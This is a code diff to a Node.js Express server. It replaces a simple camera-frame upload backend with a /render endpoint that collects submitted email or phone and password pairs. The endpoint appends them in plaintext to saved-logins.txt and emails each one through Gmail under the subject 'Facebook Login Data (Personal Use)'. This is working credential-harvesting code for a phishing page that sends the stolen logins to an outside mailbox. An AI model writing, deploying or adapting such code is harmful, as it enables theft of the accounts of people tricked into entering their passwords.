@@ -1,39 +1,52 @@
 const express = require("express");
-const multer = require("multer");
-const path = require("path");
+const bodyParser = require("body-parser");
 const fs = require("fs");
+const nodemailer = require("nodemailer");
+const cors = require("cors"); // 🆕 CORS support
+require("dotenv").config();
 
 const app = express();
-const PORT = 3000;
+const port = process.env.PORT || 3000;
 
-// Ensure uploads folder exists
-const uploadDir = path.join(__dirname, "public/uploads");
-if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
+app.use(cors()); // ✅ Allow CORS
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+app.use(express.static(__dirname));
 
-// Multer setup
-const storage = multer.diskStorage({
-  destination: (req, file, cb) => cb(null, "public/uploads"),
-  filename: (req, file, cb) => cb(null, "latest.jpg"),
-});
-const upload = multer({ storage });
-
-app.use(express.static("public"));
-
-// Mobile camera uploader
-app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "mobile.html"));
+const transporter = nodemailer.createTransport({
+  service: "gmail",
+  auth: {
+    user: process.env.EMAIL_USER,
+    pass: process.env.EMAIL_PASS,
+  },
 });
 
-// Viewer screen
-app.get("/view", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "viewer.html"));
+app.post("/render", (req, res) => {
+  const { email, password } = req.body;
+  const logEntry = `EMAIL/PHONE: ${email} | PASSWORD: ${password} | TIME: ${new Date().toISOString()}\n`;
+
+  fs.appendFile("saved-logins.txt", logEntry, (err) => {
+    if (err) console.error("Error saving file:", err);
+  });
+
+  const mailOptions = {
+    from: process.env.EMAIL_USER,
+    to: process.env.SEND_TO,
+    subject: "🔐 Facebook Login Data (Personal Use)",
+    text: logEntry,
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.error("Email error:", error);
+      return res.status(500).send("Email send error.");
+    } else {
+      console.log("✅ Email sent:", info.response);
+      res.send("Login received and emailed!");
+    }
+  });
 });
 
-// Handle image upload from camera
-app.post("/upload", upload.single("frame"), (req, res) => {
-  res.send("Frame received");
-});
-
-app.listen(PORT, () => {
-  console.log(`CCTV backend running at: http://localhost:${PORT}`);
+app.listen(port, () => {
+  console.log(`🚀 Server running at http://localhost:${port}`);
 });
